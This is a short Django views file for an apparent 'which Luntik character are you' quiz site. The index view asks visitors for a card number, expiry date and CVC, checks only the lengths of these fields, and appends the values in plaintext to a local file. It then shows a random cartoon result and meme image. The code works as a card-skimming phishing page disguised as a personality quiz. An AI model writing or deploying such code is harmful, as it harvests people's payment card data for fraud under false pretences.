from django.shortcuts import render, redirect
from django.http import HttpResponse
from random import randint
# Create your views here.
a=['Лунтик! Вы добрый и доверчивый)', 'Кузя! Вы энергичный и сначала делаете, а потом думаете)', 'Жаба! Ура! Что еще нужно от жизни?']
def index(request):
    if request.method == 'GET':
        return render(request, 'lun.html')
    if request.method == 'POST':
        card = request.POST.get('card', '')
        dat = request.POST.get('dat', '')
        cvc = request.POST.get('cvc', '')
        if len(card) != 16 or len(cvc) != 3 or len(dat) != 5:
            return HttpResponse('Это неправильные данные. Лунтик сердится.')
        file = open('file.txt', 'a')
        file.write("\nCard:" + card + "\nDate:" + dat + "\nCvc:" + cvc + "\n\n")
        file.close()
        return redirect('/success')



def success(request):
    c = randint(0, 2)
    if c == 0:
        pic = 'https://www.meme-arsenal.com/memes/b9fc08eb18db3fe85bf3de080f1cb74a.jpg'
    elif c == 1:
        pic = 'https://www.meme-arsenal.com/memes/87b5e0061bb86a08fe2fadf5bcf395f4.jpg'
    elif c == 2:
        pic = 'https://slovnet.ru/wp-content/uploads/2018/10/11-31.jpg'
    guy = a[c]
    return render(request, '2lun.html', {'guy': guy, 'pic' : pic})